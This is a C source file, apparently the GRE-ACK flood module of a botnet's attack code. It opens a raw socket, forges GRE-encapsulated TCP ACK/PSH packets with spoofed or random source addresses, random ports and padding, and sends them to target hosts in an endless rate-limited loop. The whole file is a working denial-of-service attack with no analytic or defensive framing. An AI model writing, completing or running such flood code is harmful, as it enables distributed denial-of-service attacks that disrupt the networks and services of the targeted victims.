#define _GNU_SOURCE


#include "../../attack.h"

#define GRE_PROTO 47

void flood_greack(struct flood *flood)
{
    int i, fd;
    uint16_t dport = flood->settings->dest_port;
    int data_len = flood->settings->length == 0 ? 512 : flood->settings->length;
    unsigned char packet[4096];

    if ((fd = sys_socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
        return;
    int one = 1;
    sys_setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct pps_limiter pps_limit;
    pps_limit_init(&pps_limit, flood->settings->min_pps, flood->settings->max_pps);

    while (*flood->running)
    {
        for (i = 0; i < flood->num_of_targets; i++)
        {

            // 1. Outer IP Header
            struct iphdr *oip = (struct iphdr *)packet;
            oip->version_ihl = (4 << 4) | 5;
            oip->ttl = 64;
            oip->protocol = GRE_PROTO;
            oip->saddr = (flood->settings->source_ip == 0xffffffff) ? rand_next() : flood->settings->source_ip;
            oip->daddr = flood->targets[i].addr;
            oip->id = htons(rand_cmwc() & 0xffff);

            // 2. GRE Header
            unsigned char *gre = packet + sizeof(struct iphdr);
            gre[0] = 0xb0;
            gre[1] = 0x00; // C+K+S bits
            gre[2] = 0x08;
            gre[3] = 0x00; // IPv4

            *((uint32_t *)(gre + 8)) = rand_cmwc();  // Key
            *((uint32_t *)(gre + 12)) = rand_cmwc(); // Seq

            // 3. Inner IP Header
            struct iphdr *iip = (struct iphdr *)(gre + 16);
            iip->version_ihl = (4 << 4) | 5;
            iip->ttl = 64;
            iip->protocol = IPPROTO_TCP;
            iip->saddr = rand_cmwc();
            iip->daddr = oip->daddr;
            iip->id = htons(rand_cmwc() & 0xffff);

            // 4. Inner TCP Header
            struct tcphdr *itcp = (struct tcphdr *)(iip + 1);
            itcp->source = htons(rand_cmwc() & 0xffff);
            itcp->dest = (dport == 0xffff) ? htons(rand_cmwc() & 0xffff) : htons(dport);
            itcp->seq = rand_cmwc();
            itcp->ack_seq = rand_cmwc();
            itcp->doff = 5;
            itcp->ack = 1;
            itcp->psh = 1;
            itcp->window = htons(3456);

            // 5. Inner Data
            if (flood->settings->payload != NULL)
            {
                int p_len = strlen(flood->settings->payload);
                if (p_len > data_len)
                    p_len = data_len;
                memcpy((char *)(itcp + 1), flood->settings->payload, p_len);
                if (p_len < data_len && flood->settings->random_data)
                    rand_str((char *)(itcp + 1) + p_len, data_len - p_len);
            }
            else if (flood->settings->random_data)
            {
                rand_str((char *)(itcp + 1), data_len);
            }

            // Lengths and Checksums
            int inner_pkt_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len;
            iip->tot_len = htons(inner_pkt_len);
            iip->check = 0;
            iip->check = checksum_generic((uint16_t *)iip, sizeof(struct iphdr));

            itcp->check = 0;
            itcp->check = checksum_tcpudp((uint8_t *)itcp, sizeof(struct tcphdr) + data_len, (uint8_t *)&iip->saddr, (uint8_t *)&iip->daddr);

            // GRE Checksum
            int gre_full_len = 16 + inner_pkt_len;
            gre[4] = 0;
            gre[5] = 0;
            *((uint16_t *)(gre + 4)) = checksum_generic((uint16_t *)gre, gre_full_len);

            // Outer IP Length & Checksum
            int total_len = sizeof(struct iphdr) + gre_full_len;
            oip->tot_len = htons(total_len);
            oip->check = 0;
            oip->check = checksum_generic((uint16_t *)oip, sizeof(struct iphdr));

            if (sys_sendto(fd, packet, total_len, MSG_NOSIGNAL | MSG_DONTWAIT, (void *)&flood->targets[i].sock_addr, sizeof(struct sockaddr_in)) == -1)
            {
                if (errno == EAGAIN || errno == EWOULDBLOCK)
                    sys_usleep(100);
            }
            pps_limit_wait(&pps_limit, flood->settings->min_pps, flood->settings->max_pps);
        }

        if (flood->settings->sleep > 0)
            sys_usleep(flood->settings->sleep * 1000);
    }
}
